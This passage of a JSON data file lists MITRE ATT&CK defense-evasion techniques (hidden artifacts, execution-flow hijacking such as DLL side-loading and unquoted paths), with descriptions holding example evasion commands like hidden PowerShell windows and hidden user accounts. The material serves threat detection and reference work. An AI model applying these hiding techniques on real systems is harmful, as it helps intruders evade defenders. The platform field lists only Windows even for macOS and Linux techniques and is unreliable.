      {
        "id": "T1564.001",
        "name": "Hidden Files and Directories"
      },
      {
        "id": "T1564.002",
        "name": "Hidden Users"
      },
      {
        "id": "T1564.003",
        "name": "Hidden Window"
      },
      {
        "id": "T1564.004",
        "name": "NTFS File Attributes"
      },
      {
        "id": "T1564.005",
        "name": "Hidden File System"
      },
      {
        "id": "T1564.006",
        "name": "Run Virtual Instance"
      },
      {
        "id": "T1564.007",
        "name": "VBA Stomping"
      },
      {
        "id": "T1564.008",
        "name": "Email Hiding Rules"
      },
      {
        "id": "T1564.010",
        "name": "Process Argument Spoofing"
      },
      {
        "id": "T1564.011",
        "name": "Ignore Process Interrupts"
      },
      {
        "id": "T1564.012",
        "name": "File/Path Exclusions"
      }
    ]
  },
  {
    "technique_id": "T1564.001",
    "name": "Hidden Files and Directories",
    "description": "Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a â€˜hiddenâ€™ file. These files donâ€™t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /afor Windows andls â€“afor Linux and macOS).On Linux and Mac, users can mark specific files as hidden simply by putting a \".\" as the first character in the file or folder name[1][2]. Files and folders that start with a period, â€˜.â€™, are by default hidden from being viewed in the Finder application and standard command-line utilities like \"ls\". Users must specifically change settings to have these files viewable.Files on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app[3]. On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesnâ€™t clutter up the userâ€™s workspace. For example, SSH utilities create a .ssh folder thatâ€™s hidden and contains the userâ€™s known hosts and keys.Adversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hide Artifacts",
    "parent_technique_id": "T1564",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:06:48.460696"
  },
  {
    "technique_id": "T1564.002",
    "name": "Hidden Users",
    "description": "Adversaries may use hidden users to hide the presence of user accounts they create or modify. Administrators may want to hide users when there are many user accounts on a given system or if they want to hide their administrative or other management accounts from other users.In macOS, adversaries can create or modify a user to be hidden through manipulating plist files, folder attributes, and user attributes. To prevent a user from being shown on the login screen and in System Preferences, adversaries can set the userID to be under 500 and set the key valueHide500UserstoTRUEin the/Library/Preferences/com.apple.loginwindowplist file.[1]Every user has a userID associated with it. When theHide500Userskey value is set toTRUE, users with a userID under 500 do not appear on the login screen and in System Preferences. Using the command line, adversaries can use thedsclutility to create hidden user accounts by setting theIsHiddenattribute to1. Adversaries can also hide a userâ€™s home folder by changing thechflagsto hidden.[2]Adversaries may similarly hide user accounts in Windows. Adversaries can set theHKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserListRegistry key value to0for a specific user to prevent that user from being listed on the logon screen.[3][4]On Linux systems, adversaries may hide user accounts from the login screen, also referred to as the greeter. The method an adversary may use depends on which Display Manager the distribution is currently using. For example, on an Ubuntu system using the GNOME Display Manger (GDM), accounts may be hidden from the greeter using thegsettingscommand (ex:sudo -u gdm gsettings set org.gnome.login-screen disable-user-list true).[5]Display Managers are not anchored to specific distributions and may be changed by a user or adversary.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hide Artifacts",
    "parent_technique_id": "T1564",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:06:51.796562"
  },
  {
    "technique_id": "T1564.003",
    "name": "Hidden Window",
    "description": "Adversaries may use hidden windows to conceal malicious activity from the plain sight of users. In some cases, windows that would typically be displayed when an application carries out an operation can be hidden. This may be utilized by system administrators to avoid disrupting user work environments when carrying out administrative tasks.Adversaries may abuse these functionalities to hide otherwise visible windows from users so as not to alert the user to adversary activity on the system.[1]On macOS, the configurations for how applications run are listed in property list (plist) files. One of the tags in these files can beapple.awt.UIElement, which allows for Java applications to prevent the application's icon from appearing in the Dock. A common use for this is when applications run in the system tray, but don't also want to show up in the Dock.Similarly, on Windows there are a variety of features in scripting languages, such asPowerShell, Jscript, andVisual Basicto make windows hidden. One example of this ispowershell.exe -WindowStyle Hidden.[2]The Windows Registry can also be edited to hide application windows from the current user. For example, by setting theWindowPositionsubkey in theHKEY_CURRENT_USER\\Console\\%SystemRoot%_System32_WindowsPowerShell_v1.0_PowerShell.exeRegistry key to a maximum value, PowerShell windows will open off screen and be hidden.[3]In addition, Windows supports theCreateDesktop()API that can create a hidden desktop window with its own correspondingexplorer.exeprocess.[4][5]All applications running on the hidden desktop window, such as a hidden VNC (hVNC) session,[4]will be invisible to other desktops windows.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hide Artifacts",
    "parent_technique_id": "T1564",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:06:55.143235"
  },
  {
    "technique_id": "T1564.004",
    "name": "NTFS File Attributes",
    "description": "Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition.[1]Within MFT entries are file attributes,[2]such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files).[1][3][4][5]Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus.[6][4]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hide Artifacts",
    "parent_technique_id": "T1564",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:06:58.488567"
  },
  {
    "technique_id": "T1564.005",
    "name": "Hidden File System",
    "description": "Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.[1]Adversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.[1][2]Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system.[3]Adversaries may also fragment files across the existing file system structure in non-standard ways.[4]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hide Artifacts",
    "parent_technique_id": "T1564",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:07:01.810938"
  },
  {
    "technique_id": "T1564.006",
    "name": "Run Virtual Instance",
    "description": "Adversaries may carry out malicious operations using a virtual instance to avoid detection. A wide variety of virtualization technologies exist that allow for the emulation of a computer or computing environment. By running malicious code inside of a virtual instance, adversaries can hide artifacts associated with their behavior from security tools that are unable to monitor activity inside the virtual instance.[1]Additionally, depending on the virtual networking implementation (ex: bridged adapter), network traffic generated by the virtual instance can be difficult to trace back to the compromised host as the IP address and hostname might not match known values.[2]Adversaries may utilize native support for virtualization (ex: Hyper-V) or drop the necessary files to run a virtual instance (ex: VirtualBox binaries). After running a virtual instance, adversaries may create a shared folder between the guest and host with permissions that enable the virtual instance to interact with the host file system.[3]In VMWare environments, adversaries may leverage the vCenter console to create new virtual machines. However, they may also create virtual machines directly on ESXi servers by running a valid.vmxfile with the/bin/vmxutility. Adding this command to/etc/rc.local.d/local.sh(i.e.,RC Scripts) will cause the VM to persistently restart.[4]Creating a VM this way prevents it from appearing in the vCenter console or in the output to thevim-cmd vmsvc/getallvmscommand on the ESXi server, thereby hiding it from typical administrative activities.[5]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hide Artifacts",
    "parent_technique_id": "T1564",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:07:05.133339"
  },
  {
    "technique_id": "T1564.007",
    "name": "VBA Stomping",
    "description": "Adversaries may hide malicious Visual Basic for Applications (VBA) payloads embedded within MS Office documents by replacing the VBA source code with benign data.[1]MS Office documents with embedded VBA content store source code inside of module streams. Each module stream has aPerformanceCachethat stores a separate compiled version of the VBA source code known as p-code. The p-code is executed when the MS Office version specified in the_VBA_PROJECTstream (which contains the version-dependent description of the VBA project) matches the version of the host MS Office application.[2][3]An adversary may hide malicious VBA code by overwriting the VBA source code location with zeroâ€™s, benign code, or random bytes while leaving the previously compiled malicious p-code. Tools that scan for malicious VBA source code may be bypassed as the unwanted code is hidden in the compiled p-code. If the VBA source code is removed, some tools might even think that there are no macros present. If there is a version match between the_VBA_PROJECTstream and host MS Office application, the p-code will be executed, otherwise the benign VBA source code will be decompressed and recompiled to p-code, thus removing malicious p-code and potentially bypassing dynamic analysis.[4][1][5]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hide Artifacts",
    "parent_technique_id": "T1564",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:07:08.449564"
  },
  {
    "technique_id": "T1564.008",
    "name": "Email Hiding Rules",
    "description": "Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as theNew-InboxRuleorSet-InboxRulePowerShellcmdlets on Windows systems.[1][2][3][4]Adversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses toInternal Spearphishingemails sent from the compromised account.Any user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such asmalware,suspicious,phish, andhack) found in message bodies and subject lines.[5]In some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.[6]Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hide Artifacts",
    "parent_technique_id": "T1564",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:07:11.696042"
  },
  {
    "technique_id": "T1564.010",
    "name": "Process Argument Spoofing",
    "description": "Adversaries may attempt to hide process command-line arguments by overwriting process memory. Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB.[1][2]Adversaries may manipulate a process PEB to evade defenses. For example,Process Hollowingcan be abused to spawn a process in a suspended state with benign arguments. After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using theNative APIWriteProcessMemory()function) then resume process execution with malicious arguments.[3][2][4]Adversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis.[5]This behavior may also be combined with other tricks (such asParent PID Spoofing) to manipulate or further evade process-based detections.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hide Artifacts",
    "parent_technique_id": "T1564",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:07:15.021347"
  },
  {
    "technique_id": "T1564.011",
    "name": "Ignore Process Interrupts",
    "description": "Adversaries may evade defensive mechanisms by executing commands that hide from process interrupt signals. Many operating systems use signals to deliver messages to control process behavior. Command interpreters often include specific commands/flags that ignore errors and other hangups, such as when the user of the active session logs off.[1]These interrupt signals may also be used by defensive tools and/or analysts to pause or terminate specified running processes.Adversaries may invoke processes usingnohup,PowerShell-ErrorAction SilentlyContinue, or similar commands that may be immune to hangups.[2][3]This may enable malicious commands and malware to continue execution through system events that would otherwise terminate its execution, such as users logging off or the termination of its C2 network connection.Hiding from process interrupt signals may allow malware to continue execution, but unlikeTrapthis does not establishPersistencesince the process will not be re-invoked once actually terminated.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hide Artifacts",
    "parent_technique_id": "T1564",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:07:18.343165"
  },
  {
    "technique_id": "T1564.012",
    "name": "File/Path Exclusions",
    "description": "Adversaries may attempt to hide their file-based artifacts by writing them to specific folders or file names excluded from antivirus (AV) scanning and other defensive capabilities. AV and other file-based scanners often include exclusions to optimize performance as well as ease installation and legitimate use of applications. These exclusions may be contextual (e.g., scans are only initiated in response to specific triggering events/alerts), but are also often hardcoded strings referencing specific folders and/or files assumed to be trusted and legitimate.[1]Adversaries may abuse these exclusions to hide their file-based artifacts. For example, rather than  tampering with tool settings to add a new exclusion (i.e.,Disable or Modify Tools), adversaries may drop their file-based payloads in default or otherwise well-known exclusions. Adversaries may also useSecurity Software Discoveryand otherDiscovery/Reconnaissanceactivities to both discover and verify existing exclusions in a victim environment.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hide Artifacts",
    "parent_technique_id": "T1564",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:07:21.709370"
  },
  {
    "technique_id": "T1574",
    "name": "Hijack Execution Flow",
    "description": "Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating system locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:07:24.991810",
    "subtechniques": [
      {
        "id": "T1574.001",
        "name": "DLL"
      },
      {
        "id": "T1574.005",
        "name": "Executable Installer File Permissions Weakness"
      },
      {
        "id": "T1574.007",
        "name": "Path Interception by PATH Environment Variable"
      },
      {
        "id": "T1574.008",
        "name": "Path Interception by Search Order Hijacking"
      },
      {
        "id": "T1574.009",
        "name": "Path Interception by Unquoted Path"
      },
      {
        "id": "T1574.010",
        "name": "Services File Permissions Weakness"
      },
      {
        "id": "T1574.011",
        "name": "Services Registry Permissions Weakness"
      },
      {
        "id": "T1574.012",
        "name": "COR_PROFILER"
      },
      {
        "id": "T1574.013",
        "name": "KernelCallbackTable"
      },
      {
        "id": "T1574.014",
        "name": "AppDomainManager"
      }
    ]
  },
  {
    "technique_id": "T1574.001",
    "name": "DLL",
    "description": "Adversaries may abuse dynamic-link library files (DLLs) in order to achieve persistence, escalate privileges, and evade defenses. DLLs are libraries that contain code and data that can be simultaneously utilized by multiple programs. While DLLs are not malicious by nature, they can be abused through mechanisms such as side-loading, hijacking search order, and phantom DLL hijacking.[1]Specific ways DLLs are abused by adversaries include:DLL SideloadingAdversaries may execute their own malicious payloads by side-loading DLLs. Side-loading involves hijacking which DLL a program loads by planting and then invoking a legitimate application that executes their payload(s).Side-loading positions both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.Adversaries may also side-load other packages, such as BPLs (Borland Package Library).[2]DLL Search Order HijackingAdversaries may execute their own malicious payloads by hijacking the search order that Windows uses to load DLLs. This search order is a sequence of special and standard search locations that a program checks when loading a DLL. An adversary can plant a trojan DLL in a directory that will be prioritized by the DLL search order over the location of a legitimate library. This will cause Windows to load the malicious DLL when it is called for by the victim program.[1]DLL RedirectionAdversaries may directly modify the search order via DLL redirection, which after being enabled (in the Registry or via the creation of a redirection file) may cause a program to load a DLL from a different location.[3][4]Phantom DLL HijackingAdversaries may leverage phantom DLL hijacking by targeting references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.[5][6]DLL SubstitutionAdversaries may target existing, valid DLL files and substitute them with their own malicious DLLs, planting them with the same name and in the same location as the valid DLL file.[7]Programs that fall victim to DLL hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace, evading defenses.Remote DLL hijacking can occur when a program sets its current directory to a remote location, such as a Web share, before loading a DLL.[8][9]If a valid DLL is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:07:28.349201"
  },
  {
    "technique_id": "T1574.005",
    "name": "Executable Installer File Permissions Weakness",
    "description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by an installer. These processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the%TEMP%directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage ofDLLsearch order hijacking.Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related toBypass User Account Control. Several examples of this weakness in existing common installers have been reported to software vendors.[1][2]If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:07:31.619559"
  },
  {
    "technique_id": "T1574.007",
    "name": "Path Interception by PATH Environment Variable",
    "description": "Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. The PATH environment variable contains a list of directories (User and System) that the OS searches sequentially through in search of the binary that was called from a script or the command line.Adversaries can place a malicious program in an earlier entry in the list of directories stored in the PATH environment variable, resulting in the operating system executing the malicious binary rather than the legitimate binary when it searches sequentially through that PATH listing.For example, on Windows if an adversary places a malicious program named \"net.exe\" inC:\\example path, which by default precedesC:\\Windows\\system32\\net.exein the PATH environment variable, when \"net\" is executed from the command-line theC:\\example pathwill be called instead of the system's legitimate executable atC:\\Windows\\system32\\net.exe. Some methods of executing a program rely on the PATH environment variable to determine the locations that are searched when the path for the program is not given, such as executing programs from aCommand and Scripting Interpreter.[1]Adversaries may also directly modify the $PATH variable specifying the directories to be searched.  An adversary can modify the$PATHvariable to point to a directory they have write access. When a program using the $PATH variable is called, the OS searches the specified directory and executes the malicious binary. On macOS, this can also be performed through modifying the $HOME variable. These variables can be modified using the command-line, launchctl,Unix Shell Configuration Modification, or modifying the/etc/paths.dfolder contents.[2][3][4]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:07:34.897279"
  },
  {
    "technique_id": "T1574.008",
    "name": "Path Interception by Search Order Hijacking",
    "description": "Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. UnlikeDLLsearch order hijacking, the search order differs depending on the method that is used to execute the program.[1][2][3]However, it is common for Windows to search in the directory of the initiating program before searching through the Windows system directory. An adversary who finds a program vulnerable to search order hijacking (i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.For example, \"example.exe\" runs \"cmd.exe\" with the command-line argumentnet user. An adversary may place a program called \"net.exe\" within the same directory as example.exe, \"net.exe\" will be run instead of the Windows system utility net. In addition, if an adversary places a program called \"net.com\" in the same directory as \"net.exe\", thencmd.exe /C net userwill execute \"net.com\" instead of \"net.exe\" due to the order of executable extensions defined under PATHEXT.[4]Search order hijacking is also a common practice for hijacking DLL loads and is covered inDLL.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:07:38.180267"
  },
  {
    "technique_id": "T1574.009",
    "name": "Path Interception by Unquoted Path",
    "description": "Adversaries may execute their own malicious payloads by hijacking vulnerable file path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.Service paths[1]and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g.,C:\\unsafe path with space\\program.exevs.\"C:\\safe path with space\\program.exe\").[2](stored in Windows Registry keys) An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut isC:\\program files\\myapp.exe, an adversary may create a program atC:\\program.exethat will be run instead of the intended program.[3][4]This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by a higher privileged process.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:07:41.457900"
  },
  {
    "technique_id": "T1574.010",
    "name": "Services File Permissions Weakness",
    "description": "Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:07:44.720400"
  },
  {
    "technique_id": "T1574.011",
    "name": "Services Registry Permissions Weakness",
    "description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry underHKLM\\SYSTEM\\CurrentControlSet\\Services. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,PowerShell, orReg. Access to Registry keys is controlled through access control lists and user permissions.[1][2]If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).Adversaries may also alter other Registry keys in the serviceâ€™s Registry tree. For example, theFailureCommandkey may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.[3][4]ThePerformancekey contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.[5]If thePerformancekey is not already present and if an adversary-controlled user has theCreate Subkeypermission, adversaries may create thePerformancekey in the serviceâ€™s Registry tree to point to a malicious DLL.[6]Adversaries may also add theParameterskey, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.[5][7]Additionally, If adversaries launch their malicious services using svchost.exe, the serviceâ€™s file may be identified usingHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll.[2]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:07:47.977276"
  },
  {
    "technique_id": "T1574.012",
    "name": "COR_PROFILER",
    "description": "Adversaries may leverage the COR_PROFILER environment variable to hijack the execution flow of programs that load the .NET CLR. The COR_PROFILER is a .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.[1][2]The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence. System and user-wide environment variable scopes are specified in the Registry, where aComponent Object Model(COM) object can be registered as a profiler DLL. A process scope COR_PROFILER can also be created in-memory without modifying the Registry. Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.[2]Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked. The COR_PROFILER can also be used to elevate privileges (ex:Bypass User Account Control) if the victim .NET process executes at a higher permission level, as well as to hook andImpair Defensesprovided by .NET processes.[3][4][5][6][7]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Hijack Execution Flow",
    "parent_technique_id": "T1574",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:07:51.319815"
  },
  {
    "technique_id": "T1574.013",
    "name": "KernelCallbackTable",
    "description": "Adversaries may abuse theKernelCallbackTableof a process to hijack its execution flow in order to run their own payloads.[1][2]TheKernelCallbackTablecan be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process onceuser32.dllis loaded.[3]An adversary may hijack the execution flow of a process using theKernelCallbackTableby replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such asReflective Code LoadingorProcess Injectioninto another process.A pointer to the memory address of theKernelCallbackTablecan be obtained by locating the PEB (ex: via a call to theNtQueryInformationProcess()Native APIfunction).[4]Once the pointer is located, theKernelCallbackTablecan be duplicated, and a function in the table (e.g.,fnCOPYDATA) set to the address of a malicious payload (ex: viaWriteProcessMemory()). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.[1]The tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, theKernelCallbackTablemay also be restored to its original state by the rest of the malicious payload.[1]Use of theKernelCallbackTableto hijack execution flow may evade 